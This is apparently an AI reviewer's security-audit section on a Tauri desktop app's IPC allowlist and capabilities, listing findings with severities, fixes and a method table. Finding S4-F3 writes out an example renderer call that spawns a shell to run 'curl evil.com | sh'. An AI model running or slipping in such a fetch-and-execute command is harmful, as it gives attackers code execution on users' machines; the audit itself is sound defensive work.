@@ -694,3 +694,281 @@ Surface 3 has two structural High-severity findings: **S3-F1 (carried from S1-F2
 Total: **0 Critical, 2 High, 1 Medium, 6 Low** (S3-F1 is also counted as S1-F2; net new from this deep-dive: 1 High, 1 Medium, 6 Low).
 
 ---
+
+## Surface 4 — Tauri allowlist
+
+**Reviewer:** Surface-4 subagent
+**Files audited:**
+- `packages/ui/src-tauri/src/gateway_bridge.rs` (584 lines)
+- `packages/ui/src-tauri/capabilities/default.json` (24 lines)
+- `packages/ui/src-tauri/tauri.conf.json` (49 lines)
+- `packages/ui/src-tauri/src/lib.rs` (84 lines)
+- `packages/ui/src-tauri/src/tray.rs` (151 lines)
+- `packages/ui/src-tauri/src/hitl_popup.rs` (47 lines)
+- `packages/ui/src-tauri/src/quick_query.rs` (36 lines)
+- `packages/ui/src-tauri/src/updater.rs` (91 lines)
+- `packages/gateway/src/ipc/server.ts` (1117 lines — full dispatch chain)
+- `packages/gateway/src/ipc/connector-rpc.ts` (71 lines)
+- `packages/gateway/src/ipc/connector-rpc-handlers.ts` (1104 lines)
+- `packages/gateway/src/ipc/diagnostics-rpc.ts` (471 lines)
+- `packages/gateway/src/ipc/automation-rpc.ts` (234 lines)
+- `packages/gateway/src/ipc/audit-rpc.ts` (48 lines)
+- `packages/gateway/src/ipc/data-rpc.ts` (partial — handleDataExport/Import)
+- `packages/gateway/src/commands/data-import.ts` (partial — bundlePath handling)
+- `packages/ui/src/ipc/client.ts` (523 lines)
+- `packages/ui/src/components/hitl/StructuredPreview.tsx` (82 lines)
+- `packages/ui/src/providers/GatewayConnectionProvider.tsx` (73 lines)
+- `packages/ui/src/pages/onboarding/Welcome.tsx` (76 lines)
+- `packages/ui/src/pages/onboarding/Connect.tsx` (partial — connector.startAuth usage)
+- `packages/ui/src/components/GatewayOfflineBanner.tsx` (partial — shell_start_gateway)
+
+---
+
+### Findings
+
+#### S4-F1 — `db.getMeta` and `db.setMeta` are in the allowlist but have zero gateway-side handler implementations (Medium)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:78-79` (allowlist entries), `packages/gateway/src/ipc/server.ts` (entire dispatch chain — no match found), `packages/gateway/src/ipc/diagnostics-rpc.ts` (no case for either method)
+
+**Threat:** `db.setMeta` accepts arbitrary `{ key, value }` pairs. The method name implies a metadata key/value write path into the database. The threat-model question (Surface 4 systemic question #2) specifically flags this: if a future implementation accepts arbitrary key + value without a whitelist, it becomes a surrogate for the `config.set` semantics that the allowlist test `allowlist_rejects_vault_and_raw_db_writes` was designed to prevent. Currently the method resolves to a JSON-RPC `Method not found` error at runtime (`gateway_bridge.rs:282-283` triggers `rpcVaultOrMethodNotFound` which falls through the vault dispatch and throws `-32601`). Similarly `db.getMeta` returns the same error at runtime.
+
+**Observed behaviour:** `packages/ui/src/providers/GatewayConnectionProvider.tsx:31` calls `db.getMeta({ key: "onboarding_completed" })` and `packages/ui/src/pages/onboarding/Welcome.tsx:9` and `Syncing.tsx:30,52` call `db.setMeta({ key: "onboarding_completed", value: <ISO string> })`. These calls silently fail at runtime with a `Method not found` error — the catch blocks swallow the error. This means onboarding state is never persisted, making the intended first-run routing in `GatewayConnectionProvider` permanently broken (always sends new-install users through onboarding, since `meta == null` is always true).
+
+**Severity:** Medium — the missing handler is both a functional bug (broken onboarding gate) and a latent security risk (when the handler is eventually implemented, there is no existing validation pattern to follow, creating pressure toward an unwhitelisted `config.set`-equivalent).
+
+**Suggested fix:** Either (a) implement a tightly scoped handler in `diagnostics-rpc.ts` that only accepts a hardcoded set of allowed meta keys (e.g. `onboarding_completed`), throws on unknown keys, and stores the value in a dedicated `meta` table — never allowing keys that could shadow config or vault fields; or (b) remove both methods from `ALLOWED_METHODS` and the allowlist test `allowlist_ws5a_methods` and implement the onboarding flag via an existing gated path (e.g. `telemetry.setEnabled` pattern). Add a negative test: `allowlist_rejects_vault_and_raw_db_writes` should also assert `!is_method_allowed("db.setMetaRaw")` and the implementation must reject key=`"nimbus_config"` or any key outside a fixed set.
+
+---
+
+#### S4-F2 — `connector.startAuth` is in the allowlist but has no gateway-side handler (Low)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:71` (allowlist entry); `packages/gateway/src/ipc/connector-rpc.ts` (no `connector.startAuth` case in `dispatchConnectorRpc` switch); `packages/ui/src/pages/onboarding/Connect.tsx:56` (frontend caller)
+
+**Threat:** The method exists in `ALLOWED_METHODS` but the gateway only handles `connector.auth` (line 66 of `connector-rpc.ts`). The frontend (`Connect.tsx:56`) calls `connector.startAuth` believing it will initiate OAuth; the gateway responds with `-32601 Method not found`. The silent catch at `Connect.tsx:57` sets `authStatus` to `"failed"` — users cannot complete OAuth from the Tauri UI onboarding flow. This is a stale allowlist entry creating a dead code path.
+
+**Severity:** Low — the allowlist test for `connector.startAuth` (`allowlist_ws5a_methods`) passes (the entry exists) but no functional protection is bypassed today. However, if a future handler is added under this method name without re-auditing the full list, the allowlist could grant the Tauri frontend access to an auth-token-writing handler that was not reviewed with the full threat surface in mind.
+
+**Suggested fix:** Either rename the allowlist entry to `connector.auth` (matching the actual handler) and update `Connect.tsx:56` accordingly, or implement a `connector.startAuth` handler that delegates to `handleConnectorAuth`. Remove the test assertion `assert!(is_method_allowed("connector.startAuth"))` and replace with `assert!(is_method_allowed("connector.auth"))`.
+
+---
+
+#### S4-F3 — `shell:allow-spawn` is unrestricted in capabilities; `shell:allow-execute` is correctly scoped, but the broader `allow-spawn` grants arbitrary process execution to any Tauri API consumer (High)
+
+**File:** `packages/ui/src-tauri/capabilities/default.json:8` (`"shell:allow-spawn"`); `packages/ui/src-tauri/src/lib.rs:14` (plugin init)
+
+**Threat:** Tauri 2's capability model distinguishes two shell permissions:
+- `shell:allow-execute` — restricted to a specific named command + args allowlist (correctly configured to `nimbus start` only at `default.json:9-14`).
+- `shell:allow-spawn` — grants the JS renderer the ability to call `Command.spawn(arbitraryBinary, arbitraryArgs)` without restriction.
+
+Both permissions are granted simultaneously. In Tauri 2, `shell:allow-spawn` without a scope allows the WebView's JavaScript to spawn arbitrary OS processes under the user's uid. The threat actor here is M6 (compromised renderer via XSS or a malicious renderer injection). A renderer XSS that calls `window.__TAURI__.shell.Command.spawn('/bin/sh', ['-c', 'curl evil.com | sh'])` on macOS/Linux, or the Windows equivalent, would achieve remote code execution under the user's account without needing to go through the gateway IPC.
+
+**Verification:** The Tauri 2 plugin-shell docs confirm that `shell:allow-spawn` with no scope allows spawning any program. The source code at `lib.rs:14` initialises `tauri_plugin_shell::init()` with no scope restrictions beyond what `default.json` declares.
+
+**Severity:** High — if the WebView renderer is compromised (e.g. via an XSS in a third-party HTML widget loaded by the app, or via an injected script in a compromised dependency), arbitrary process execution is achievable. This is structurally equivalent to the Surface 7 extension spawn risk but reachable from the renderer without any user interaction.
+
+**Suggested fix:** Remove `"shell:allow-spawn"` from `capabilities/default.json`. The only shell invocation Nimbus needs from the renderer is `nimbus start` (already covered by the scoped `shell:allow-execute`). The Rust-side `shell_start_gateway` command uses `app.shell().command("nimbus").args(["start"]).spawn()` (`gateway_bridge.rs:501-509`), which requires the `shell:allow-spawn` permission in Tauri 2's plugin-shell. Investigate whether this Rust command requires `shell:allow-spawn` or `shell:allow-execute` — if the former, the fix is to expose a dedicated Tauri command that does not require the unrestricted permission. If the shell plugin's Rust API (`app.shell()...`) bypasses capability checks (Rust-side commands are not capability-gated), then `shell:allow-spawn` is only needed for JS-side calls and can be removed safely.
+
+---
+
+#### S4-F4 — `tauri.conf.json` sets `"csp": null` — no Content Security Policy on any WebView window (Medium)
+
+**File:** `packages/ui/src-tauri/tauri.conf.json:28-30`
+
+**Threat:** With `"csp": null`, Tauri's WebView has no CSP applied. This means:
+- Inline `<script>` tags are not blocked.
+- `eval()` is not blocked (though no `eval` patterns were found in `packages/ui/src/` during this audit).
+- Resources can be loaded from arbitrary external origins without restriction.
+- A compromised renderer (e.g. via a 3rd-party dependency that renders arbitrary user data) can inject and execute scripts freely.
+
+Because the Tauri allowlist (`ALLOWED_METHODS`) gates method-level access, the primary risk is XSS leading to unintended `rpc_call` invocations — specifically calling mutating allowlist methods (`data.import`, `extension.install`, `watcher.create`, `workflow.save`, `updater.applyUpdate`) without user intent.
+
+**Observed scope:** No `dangerouslySetInnerHTML`, no `eval(`, and no `new Function(` patterns were found in `packages/ui/src/` or `packages/ui/src-tauri/src/` during this audit. The `StructuredPreview` component that renders HITL consent details uses React's virtual DOM exclusively (XSS-safe). However, the absence of a CSP means defence-in-depth relies entirely on the React renderer and the dependency chain.
+
+**Severity:** Medium — the immediate risk without a CSP is moderate because the app does not load third-party scripts and React's JSX rendering is XSS-safe by default. However, the `shell:allow-spawn` finding (S4-F3) and `extension.install`/`data.import` in the allowlist make XSS-to-RCE a plausible chain. A CSP would break that chain.
+
+**Suggested fix:** Set a tight CSP in `tauri.conf.json`: `"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src ipc: http://ipc.localhost"`. Test all UI panels still render correctly (Tauri's `asset:` protocol). `'unsafe-inline'` for styles is common and acceptable; `'unsafe-eval'` must not be added. Remove `"csp": null`.
+
+---
+
+#### S4-F5 — `extension.install` accepts a caller-supplied `sourcePath` (filesystem path); no Tauri-level path validation or dialog requirement (Medium)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:84` (`extension.install` in allowlist); `packages/gateway/src/ipc/automation-rpc.ts:150-179` (handler); `packages/ui/src/ipc/client.ts:468-470` (frontend call site)
+
+**Threat:** The frontend calls `extension.install({ sourcePath: "/arbitrary/path" })`. The gateway handler (`automation-rpc.ts:150-179`) passes `sourcePath` directly to `installExtensionFromLocalDirectory`. There is no dialog-based path selection enforced at the Tauri layer — the frontend can supply any absolute path available on the filesystem. A compromised renderer (M6) can install an extension from any readable path without user-initiated file-picker interaction.
+
+**Mitigation already in place (partial):** `installExtensionFromLocalDirectory` validates the extension manifest (SHA-256 pinning, entry-path traversal check via `assertEntryInsideInstall`). However, these checks only enforce structural integrity of the extension once located — they do not constrain which directory the extension comes from.
+
+**Severity:** Medium — exploiting this requires: (a) renderer compromise, and (b) a malicious directory already on the filesystem that passes manifest validation. Given that `dialog:allow-open` is already in capabilities, the UI could require a user-initiated file-picker before passing the path to `extension.install`. This would make the attack harder.
+
+**Suggested fix:** In the frontend code that invokes `extensionInstall`, always acquire the path via `dialog.open()` (already permitted by `dialog:allow-open`) rather than accepting an arbitrary string from application state or user-typed input. Consider adding a Rust-side command `extension_install_from_dialog` that opens the dialog in Rust and passes the resulting path directly to the gateway, so JS never holds an unvalidated path.
+
+---
+
+#### S4-F6 — `data.import` in `NO_TIMEOUT_METHODS` accepts a caller-supplied `bundlePath` with no Tauri-level path validation or dialog requirement; path traversal not defended at the IPC boundary (Low)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:135` (`data.import` in `NO_TIMEOUT_METHODS`); `packages/gateway/src/ipc/data-rpc.ts:87-95` (parameter extraction); `packages/gateway/src/commands/data-import.ts:64-66` (`unpackBundle(input.bundlePath, stage)`)
+
+**Threat:** The `bundlePath` parameter is accepted as a raw string from the frontend with only a non-empty check. `unpackBundle` calls `tar` (or its equivalent) on the supplied path. If a path outside the user's data directory is supplied (e.g. a crafted attacker-controlled `.tar.gz` in a world-readable location), it is processed without restriction. The gateway-side manifest verification (`verifyManifest`) and schema check occur after unpacking, which means a malformed tar can still be expanded to the temp staging directory.
+
+**Current defence:** `data.import` is in `NO_TIMEOUT_METHODS` (correctly, for large archives). The tar extraction uses `mkdtempSync` for staging (safe against TOCTOU). The manifest integrity check runs post-unpack and throws on mismatch, aborting import.
+
+**Severity:** Low — the tar bomb / path-traversal risk during unpacking is the primary concern. GNU tar refuses path traversal by default; see Surface 7 analysis for the Windows-BSD-tar caveat. The missing defence is a dialog-gated path acquisition (same as S4-F5).
+
+**Suggested fix:** Require path acquisition via `dialog.open()` before calling `data.import`. Cross-reference the Surface 7 `extractTarGzToDirectory` Windows-tar finding.
+
+---
+
+#### S4-F7 — `connector.list` is referenced in the frontend (`Connect.tsx:63`) but is absent from `ALLOWED_METHODS` — frontend polling will silently fail with `ERR_METHOD_NOT_ALLOWED` (Low)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:63-120` (ALLOWED_METHODS — `connector.list` is absent); `packages/ui/src/pages/onboarding/Connect.tsx:63` (caller)
+
+**Threat:** The onboarding `Connect.tsx` calls `connector.list` in a polling loop to detect when a connector becomes authenticated. Since `connector.list` is not in `ALLOWED_METHODS`, `rpc_call` returns `ERR_METHOD_NOT_ALLOWED`, which is caught silently at `Connect.tsx:76-78`. The poll never succeeds; the user cannot proceed past the connector auth step via the Tauri UI. This is a broken functional path, not a security bypass.
+
+**Severity:** Low — no security impact; broken feature flow. However, if `connector.list` were added to the allowlist in a future commit without a security review (it returns the full list of connector sync-states including which connectors are authenticated), it would become a low-sensitivity information disclosure surface (no credential values, just connector names and auth states).
+
+**Suggested fix:** Either add `connector.list` to `ALLOWED_METHODS` (with a corresponding test assertion) after verifying the handler returns only connector names and authentication booleans, not tokens; or replace the polling with `connector.listStatus` (which is already in the allowlist and returns equivalent information).
+
+---
+
+#### S4-F8 — `GLOBAL_BROADCAST_METHODS = ["profile.switched"]`: `profile://switched` event is emitted to every window; the HITL popup window's response to this event (app restart) can be triggered by any gateway notification without per-window authentication (Low)
+
+**File:** `packages/ui/src-tauri/src/gateway_bridge.rs:148,573-580` (`GLOBAL_BROADCAST_METHODS`, `classify_notification` profile.switched branch)
+
+**Threat:** When the gateway emits `profile.switched`, `classify_notification` calls `app.emit("profile://switched", p)`, which broadcasts to every open window including the HITL popup. The HITL popup's JS listener on `profile://switched` triggers `app.restart()` (as documented in `gateway_bridge.rs:573-576` comment: "Each window's JS listener triggers `app.restart()`; the first to fire wins"). A gateway-level notification that emits `profile.switched` will cause the HITL popup to close (via restart), potentially aborting an in-progress consent flow.
+
+**Vector:** A legitimate `profile.switch` IPC call (which any allowlisted client can make, including a renderer) causes restart. The restart is intentional. The risk is a malicious renderer sending `profile.switch` as a DoS against a pending HITL flow — the approval popup disappears, the pending consent request is left in the queue as rejected (per `ConsentCoordinatorImpl.onClientDisconnect`), and no approval is recorded. This is a consent-abortion vector, not a bypass (rejected == no action taken).
+
+**Severity:** Low — HITL is rejected (not forged approved), which is the safe failure mode. The impact is DoS of the HITL flow, not privilege escalation.
+
+**Suggested fix:** Before restarting in response to `profile://switched`, the HITL popup should drain pending consents with `rejected` audit entries before calling `app.restart()`. Alternatively, the HITL popup should not restart on profile switch while a consent is in progress — instead queue the restart.
+
+---
+
+### ALLOWED_METHODS table (56 methods)
+
+| Method | Parameter shape (key fields) | Server-side validation | Worst-case if frontend lies | Finding |
+|---|---|---|---|---|
+| `audit.export` | none | none needed | Returns all audit rows (up to 10,000) — information disclosure limited to audit content | — |
+| `audit.getSummary` | none | none needed | Returns aggregate counts | — |
+| `audit.list` | `limit?: number` | clamped 1–1000 | Returns up to 1000 audit rows; full `action_json` visible | — |
+| `audit.verify` | `full?: boolean` | boolean check | Reads and verifies audit chain; no write | — |
+| `connector.list` | none | n/a | `ERR_METHOD_NOT_ALLOWED` (not in allowlist) | S4-F7 |
+| `connector.listStatus` | `serviceId?: string` | validated against connector catalog | Returns sync state; no credential disclosure | — |
+| `connector.setConfig` | `service, intervalMs?, depth?, enabled?` | service validated against DB; depth enum-checked; intervalMs >= 60s | Worst: sets sync interval to minimum (60s), enables a disabled connector, or changes depth — no credential access | — |
+| `connector.startAuth` | `service` | n/a (no handler) | `Method not found` at runtime | S4-F2 |
+| `consent.respond` | `requestId, approved` | `ConsentCoordinatorImpl.handleRespond` checks clientId ownership | Reject a pending consent from the same client | — |
+| `data.delete` | `service, dryRun` | service validated; dryRun boolean | Deletes all index rows and vault keys for a service; no HITL gate | — |
+| `data.export` | `output, passphrase, includeIndex` | output non-empty string; passphrase non-empty | Writes an encrypted bundle to any writable path specified by frontend | S4-F6 (partial) |
+| `data.getDeletePreflight` | `service` | service validated | Returns item counts; no write | — |
+| `data.getExportPreflight` | none | none needed | Returns size estimates; no write | — |
+| `data.import` | `bundlePath, passphrase?, recoverySeed?` | bundlePath non-empty string only | Extracts tar at arbitrary path; vault overwrite on success | S4-F6 |
+| `db.getMeta` | `key: string` | n/a (no handler) | `Method not found` at runtime | S4-F1 |
+| `db.setMeta` | `key, value: string` | n/a (no handler) | `Method not found` at runtime; future risk if implemented without key whitelist | S4-F1 |
+| `diag.getVersion` | none | none | Returns version string, commit, buildId from `process.env` | — |
+| `diag.snapshot` | none | none | Returns connector health, metrics, last 10 audit rows, watcher list — read-only | — |
+| `engine.askStream` | `input: string, sessionId?, stream?` | `agentInvokeHandler` must be set | Submits arbitrary agent query; HITL gates destructive ops | — |
+| `extension.disable` | `id: string` | `id` non-empty | Disables extension by DB id; no filesystem side-effect | — |
+| `extension.enable` | `id: string` | `id` non-empty | Enables extension; gateway spawns it on next sync | — |
+| `extension.install` | `sourcePath: string` | `sourcePath` non-empty; gateway validates manifest + hashes | Installs extension from any readable path without dialog | S4-F5 |
+| `extension.list` | none | none | Returns installed extensions list | — |
+| `extension.remove` | `id: string` | `id` non-empty | Removes extension from DB + filesystem (`rmSync`) | — |
+| `index.metrics` | none | none | Returns aggregate item counts, embedding coverage, latency percentiles | — |
+| `llm.cancelPull` | `pullId: string` | passed to registry | Cancels in-flight model pull | — |
+| `llm.getRouterStatus` | none | none | Returns routing decisions per task type | — |
+| `llm.getStatus` | none | none | Returns Ollama/llama-server availability | — |
+| `llm.listModels` | none | none | Returns installed model list | — |
+| `llm.loadModel` | `provider, modelName` | provider enum; modelName string | Loads a model into GPU VRAM; DoS if called repeatedly | — |
+| `llm.pullModel` | `provider, modelName` | provider enum; modelName string | Initiates model download from Ollama/HuggingFace registry | — |
+| `llm.setDefault` | `taskType, provider, modelName` | taskType and provider enum-validated | Sets the default model for a task type | — |
+| `llm.unloadModel` | `provider, modelName` | provider enum; modelName string | Evicts a model from GPU memory | — |
+| `profile.create` | `name: string` | name non-empty | Creates a new config profile on disk | — |
+| `profile.delete` | `name: string` | name non-empty; cannot delete active | Deletes a profile | — |
+| `profile.list` | none | none | Returns profile list | — |
+| `profile.switch` | `name: string` | name non-empty | Switches active profile; triggers global restart broadcast | S4-F8 |
+| `telemetry.getStatus` | none | none | Returns telemetry enable state and aggregate counters | — |
+| `telemetry.setEnabled` | `enabled: boolean` | boolean type-checked | Writes or deletes `.nimbus-telemetry-disabled` marker file | — |
+| `updater.applyUpdate` | none | requires `lastManifest` populated | Downloads + verifies + runs installer; no version floor check (Surface 6 finding) | — |
+| `updater.checkNow` | none | none | Fetches manifest from CDN; populates `lastManifest` | — |
+| `updater.getStatus` | none | none | Returns updater state machine status | — |
+| `updater.rollback` | none | none | Invokes platform rollback | — |
+| `watcher.create` | `name, conditionType, conditionJson, actionType, actionJson, graphPredicateJson?` | all strings non-empty; graphPredicateJson parsed via `parseGraphPredicate` | Inserts a watcher row; condition/action JSON stored verbatim — no HITL gate; malicious `actionJson` could affect watcher engine behaviour | — |
+| `watcher.delete` | `id: string` | `id` non-empty | Deletes watcher by id | — |
+| `watcher.list` | none | none | Returns all watchers | — |
+| `watcher.listCandidateRelations` | none | none | Returns static relation type list | — |
+| `watcher.listHistory` | `watcherId, limit` | both required; limit is a number | Returns watcher fire history | — |
+| `watcher.pause` | `id: string` | `id` non-empty | Disables watcher | — |
+| `watcher.resume` | `id: string` | `id` non-empty | Re-enables watcher | — |
+| `watcher.validateCondition` | `graphPredicateJson, sinceMs` | parsed via `parseGraphPredicate`; sinceMs required number | Returns match count; read-only | — |
+| `workflow.delete` | `name: string` | name non-empty | Deletes workflow by name | — |
+| `workflow.list` | none | none | Returns all workflows | — |
+| `workflow.listRuns` | `workflowName, limit` | both required | Returns run history | — |
+| `workflow.run` | `name, triggeredBy?, dryRun?, stream?, sessionId?, agent?, paramsOverride?` | name non-empty; paramsOverride type-checked | Executes a workflow; steps call `runConversationalAgent` — no direct HITL-gated tool access | — |
+| `workflow.save` | `name, stepsJson, description?` | name + stepsJson non-empty strings | Saves workflow definition; `stepsJson` stored verbatim — no schema validation of step content | — |
+
+---
+
+### NO_TIMEOUT_METHODS analysis
+
+| Method | Rationale for no timeout | DoS vector | Finding |
+|---|---|---|---|
+| `data.export` | Large archives can take minutes; progress via `data.exportProgress` notifications | A renderer bug/attack can call this repeatedly, saturating disk I/O; no cancel endpoint (`data.cancelExport` does not exist) | Low DoS — parallel exports queue behind each other at the gateway; no cancel path |
+| `data.import` | Large bundles; tar extraction + AES-GCM decryption takes O(archive size) | Renderer can call with a very large `bundlePath` archive, blocking the gateway; no cancel path | S4-F6 (low) |
+| `llm.pullModel` | Model downloads are 2–30 GB and stream progress | `llm.cancelPull` exists — cancellable; DoS vector is modest | `llm.cancelPull` correctly mitigates; no finding |
+| `updater.applyUpdate` | Platform installer may take minutes; triggers process restart | A renderer attack can repeatedly apply; each apply is Ed25519-verified so only legitimate binaries install, but the restart side-effect is still disruptive | Low — manifest verification prevents installing arbitrary code, but forced-restart DoS is possible |
+
+**Summary:** The absence of timeout on `data.export` and `data.import` is architecturally sound (run-to-completion semantics). The security gap is the absence of a cancel endpoint for `data.export` and `data.import`, meaning a malicious renderer can monopolise the gateway for an arbitrarily long operation. Severity is Low because no credential or code-execution impact results; the worst case is a hung gateway requiring manual restart.
+
+---
+
+### Tauri capabilities review
+
+| Capability | Scope | Minimal? | Finding |
+|---|---|---|---|
+| `core:default` | Standard Tauri core (window management, etc.) | Yes — required for any Tauri app | — |
+| `shell:allow-spawn` | Unrestricted — any binary, any args | **No** — no scope restriction; allows JS to spawn arbitrary processes | **S4-F3 (High)** |
+| `shell:allow-execute` | Scoped to `nimbus start` only | Yes — correctly scoped | — |
+| `global-shortcut:allow-register` | Global keyboard shortcut registration | Minimal — needed for Ctrl+Shift+N quick-query hotkey | — |
+| `global-shortcut:allow-unregister` | Global keyboard shortcut deregistration | Minimal — needed for cleanup | — |
+| `clipboard-manager:allow-write-text` | Write text to clipboard | Minimal — needed for copy actions | — |
+| `clipboard-manager:allow-clear` | Clear clipboard | Minimal | — |
+| `dialog:allow-save` | User-initiated save dialog (returns a path) | Yes — needed for export | — |
+| `dialog:allow-open` | User-initiated open dialog (returns a path) | Yes — needed for import | — |
+| `fs:allow-write-text-file` | Write any text file to any path accessible by the app | **Questionable** — no path scope restriction | See note below |
+| `tauri.conf.json CSP` | `"csp": null` — no Content Security Policy | **No** | **S4-F4 (Medium)** |
+
+**Note on `fs:allow-write-text-file`:** In Tauri 2, `fs:allow-write-text-file` without a scope allows the renderer to write text files to any path the user's OS account can write. The primary use case is writing the audit export JSON after a `dialog:allow-save` selection. The risk is that a compromised renderer can write to arbitrary paths (e.g. overwrite `~/.bashrc` on Linux, `~/.zshrc` on macOS, or a startup script on Windows). This is a Medium-tier hardening gap. **Suggested fix:** Add an `fs` scope limiting writes to `$APPDATA` / `$HOME/Downloads` or the path returned by the save dialog only — Tauri 2 supports `allow: [{ path: "$DESKTOP/**" }]` etc. in capability JSON.
+
+---
+
+### Negative-pattern scan results
+
+- `eval(` — **zero matches** in `packages/ui/src/` and `packages/ui/src-tauri/src/`
+- `new Function(` — **zero matches**
+- `dangerouslySetInnerHTML` — **zero matches**; `StructuredPreview.tsx` uses React JSX throughout — XSS-safe
+- `localStorage.setItem.*token` (case-insensitive) — **zero matches**
+- `sessionStorage.setItem.*token` (case-insensitive) — **zero matches**
+- `// TODO.*remove` / `// FIXME.*before.*release` / `// HACK` — **zero matches** in both `packages/ui/src/` and `packages/ui/src-tauri/src/`
+- Hardcoded non-localhost URLs in non-test code — **zero matches** in TypeScript/Rust sources
+
+---
+
+### Observations on correct behaviour (no finding)
+
+- **`StructuredPreview.tsx` XSS safety** (threat model systemic question #18): The component renders HITL consent `details` exclusively through React's JSX, with no `dangerouslySetInnerHTML`. Scalar strings are rendered via `<>{s}</>`, objects via `<dl>` grids, arrays via `<ul>`. Confirmed XSS-safe.
+- **Vault exclusion from allowlist:** `vault.get`, `vault.set`, `vault.list` are correctly absent from `ALLOWED_METHODS`. The test `allowlist_rejects_vault_and_raw_db_writes` at `gateway_bridge.rs:421-429` asserts this. The gateway-side `dispatchVaultIfPresent` still handles vault methods for CLI clients over the Unix socket, which is correct.
+- **`GLOBAL_BROADCAST_METHODS` is minimal:** Only `profile.switched` is in the broadcast list. `consent.request` and `connector.healthChanged` are window-scoped (emitted only to the initiating window or via `app.emit` to all but with event name scoping). The threat-model observation (systemic question #9) that JS cannot forge a `profile.switched` event to other windows is confirmed — `classify_notification` runs in Rust and is triggered only by the authenticated gateway socket connection.
+- **Request ID wrapping:** `gateway_bridge.rs:294` uses `wrapping_add(1)` on a `u64`. After 2^64 calls the id wraps. The `pending` map uses `String` keys (`"r{id}"`); collision requires 2^64 distinct in-flight requests, which is practically impossible. Confirmed low-risk.
+- **Reconnect handling:** On `connect_and_run` loop reconnect, all in-flight `oneshot` senders are drained with `Err(Value::String("ERR_GATEWAY_OFFLINE"))` (`gateway_bridge.rs:271-273`). Frontend `rpc_call` returns `Err("ERR_GATEWAY_OFFLINE")` which `parseError` in `client.ts:186-187` converts to `GatewayOfflineError`. Callers must handle this; confirmed the `ipc/client.ts` error path does.
+- **`hitl_resolved` Rust command:** `gateway_bridge.rs:516-528` — the frontend calls `hitl_resolved(requestId, approved)` after `consent.respond` to remove the HITL inbox entry and fan out `consent://resolved`. This is a Rust-side command (not an RPC call), not gated by `ALLOWED_METHODS`. It is safe: removing a request ID from the inbox is idempotent and carries no security consequence.
+
+---
+
+### Summary
+
+Surface 4 has one **High** finding and three **Medium** findings. The High finding (**S4-F3**, `shell:allow-spawn` is unrestricted) means a compromised WebView renderer can spawn arbitrary OS processes without going through the gateway allowlist; this is the most structurally significant gap on this surface. The two Medium findings are: **S4-F1** (`db.getMeta`/`db.setMeta` in the allowlist with no handler — broken onboarding feature and latent key-injection risk if implemented without a whitelist) and **S4-F4** (`"csp": null` — no Content Security Policy removes the browser-level XSS mitigation layer). A third Medium finding (**S4-F5**) covers `extension.install` accepting an arbitrary path without a dialog requirement. The three Low findings cover a missing `connector.list` handler (`S4-F7`), a stale `connector.startAuth` allowlist entry (`S4-F2`), and a profile-switch-induced HITL abort DoS (`S4-F8`).
+
+The forbidden-pattern scan is entirely clean: zero `eval(`, `new Function(`, `dangerouslySetInnerHTML`, token-in-localStorage, debug-comment, or hardcoded external URL patterns in `packages/ui/src/` or `packages/ui/src-tauri/src/`. The `StructuredPreview.tsx` HITL renderer is XSS-safe. The allowlist size, alphabetisation, no-duplicate, and vault-exclusion invariants are all correctly asserted in unit tests and confirmed by inspection.
+
+Total: **0 Critical, 1 High, 3 Medium, 3 Low**
+
+---
